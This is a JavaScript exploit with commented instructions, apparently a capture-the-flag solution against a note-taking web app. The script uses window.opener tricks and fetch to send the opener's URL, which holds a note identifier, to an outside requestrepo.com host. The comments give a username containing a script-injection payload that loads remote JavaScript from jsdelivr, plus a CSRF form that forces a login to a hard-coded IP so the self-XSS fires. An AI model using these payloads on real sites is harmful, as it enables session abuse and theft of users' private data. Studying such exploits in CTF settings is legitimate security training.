window.open('/test');

function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

if (window.location.hash == '#child') {
  // The child acts as the "puppet master"
  // The parent should now be on the previous page (with the note UUID in the URL param)
  console.log('sleeping');
  fetch('https://ov4f10db.requestrepo.com/final?'+window.opener.location.href);
  sleep(1000).then(() => {
    window.location.reload();
  });
} else if (window.location.hash == "") {
  // Open child window
  window.open('/#child');

  // Go back to previous note page
  sleep(100).then(() => {
    window.history.back();
  });
};

/*
Instructions:

go to requestrepo.com
In the response tab, upload the CSRF poc below as the response

Then, before you can trigger it you need to create the malicious user (with password = password): 
</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@f71332b1fd7b27614ca5050045a86ef9208eeb55/uh.js'></script>

Then (for testing purposes) create new innocuous username, save a flag note, then visit the requestrepo.com domain you've hosted. MAKE SURE TO USE HTTP e.g. http://test.requestrepo.com.

CSRF POC:

<!DOCTYPE html>
<html>
  <body>
    <form action="http://65.21.3.129:10102/login" method="POST" id="csrf">
      <input type="hidden" name="username" value="</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@f71332b1fd7b27614ca5050045a86ef9208eeb55/uh.js'>//">
      <input type="hidden" name="password" value="password">
    </form>
    <script>
      document.getElementById("csrf").submit();
    </script>
  </body>
</html>

# this is the CSRF
Look at the payload to see how I get self-xss
*/
